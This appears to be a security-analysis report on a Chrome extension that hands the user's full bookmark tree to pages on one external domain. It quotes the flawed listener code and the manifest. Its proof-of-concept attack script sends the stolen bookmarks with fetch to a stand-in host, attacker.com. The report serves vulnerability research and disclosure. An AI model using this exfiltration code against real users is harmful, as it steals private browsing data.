# CoCo Analysis: lbhlilmkohaogiejpflobpkcloflnfea

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 11 (all related to same information disclosure vulnerability)

---

## Sink 1-11: BookmarkTreeNode_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lbhlilmkohaogiejpflobpkcloflnfea/opgen_generated_files/bg.js
Multiple lines detecting BookmarkTreeNode properties flowing to sendResponseExternal

**Code:**

```javascript
// Background script - bg.js (line 965, minified code reformatted for clarity)
chrome.runtime.onMessageExternal.addListener((function(e, o, n) { // ← external message handler
	if ("bookmark" === e.name) { // ← attacker sends {name: "bookmark"}
		return chrome.bookmarks.getTree(e => { // ← retrieves full bookmark tree
			const o = getBookInfo(e[0].children);
			n(o); // ← sends bookmarks back to external caller
		}), !0
	}
}));

// Helper function to process bookmarks
function treehelper2(e) {
	if (Array.isArray(e))
		for (const o of e) treehelper2(o);
	else {
		for (const o of Object.keys(e))
			"title" !== o && "url" !== o && "children" !== o && delete e[o]; // Filters to keep title, url, children
		e.children && treehelper2(e.children)
	}
}

function getBookInfo(e) {
	return treehelper2(e), e // Returns filtered bookmark tree
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Manifest externally_connectable:**
```json
"externally_connectable": {
	"matches": ["*://*.kunquer.com/*"]
}
```

**Permissions:**
```json
"permissions": [
	"bookmarks",  // ← allows reading user bookmarks
	// ... other permissions
]
```

**Attack:**

```javascript
// From any page on *.kunquer.com domain
// Attacker can retrieve all user bookmarks
chrome.runtime.sendMessage('lbhlilmkohaogiejpflobpkcloflnfea', {
	name: 'bookmark'
}, function(bookmarks) {
	// bookmarks contains entire user bookmark tree
	// with title, url, and folder structure
	console.log('Stolen bookmarks:', bookmarks);

	// Exfiltrate to attacker server
	fetch('https://attacker.com/collect', {
		method: 'POST',
		body: JSON.stringify({
			victim_bookmarks: bookmarks
		})
	});
});
```

**Impact:** Information disclosure - complete exfiltration of user's bookmark tree. An attacker controlling content on kunquer.com domain can steal all user bookmarks including URLs, titles, and folder organization. This reveals user's browsing history, interests, internal corporate URLs, banking sites, and other sensitive information stored in bookmarks. The bookmarks are automatically filtered and returned in a structured format making them easy to process and exfiltrate.
